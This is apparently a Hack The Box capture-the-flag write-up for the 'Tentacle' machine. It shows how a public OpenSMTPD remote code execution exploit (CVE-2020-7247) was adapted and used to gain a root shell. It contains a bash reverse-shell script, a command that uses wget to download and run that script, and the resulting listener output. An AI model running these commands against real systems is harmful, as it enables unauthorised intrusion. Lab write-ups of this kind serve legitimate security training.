# Enumeration-
Googling for “opensmtpd exploit” returns a remote code execution exploit from [Exploit-DB](https://www.exploit-db.com/exploits/47984), CVE-2020-7247.

# Exploit-
We just have to chnange the receipient from root to `j.nakazawa@realcorp.htb`-

FROM-
```bash
print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
```

TO-
```bash
print('[*] Payload sent')
s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')
```

# Shell-
shell.sh
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.82/9001 0>&1
```

While hosting a python server and listening on netcat we got our shell-

```bash
root@napster:~/Documents/HTB/Tentacle# proxychains python3 smtp_exploit.py 10.241.251.113 25 'wget 10.10.14.82/shell.sh -O /dev/shm/shell.sh; bash /dev/shm/shell.sh'
ProxyChains-3.1 (http://proxychains.sf.net)
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```bash
root@napster:~/Documents/HTB/Tentacle# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.224 - - [26/Jun/2021 17:52:15] "GET /shell.sh HTTP/1.1" 200 -
```

```bash
root@napster:~/Documents/HTB/Tentacle# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.82] from (UNKNOWN) [10.10.10.224] 46284
bash: cannot set terminal process group (13): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~# 
```


![[Pasted image 20210626175713.png]]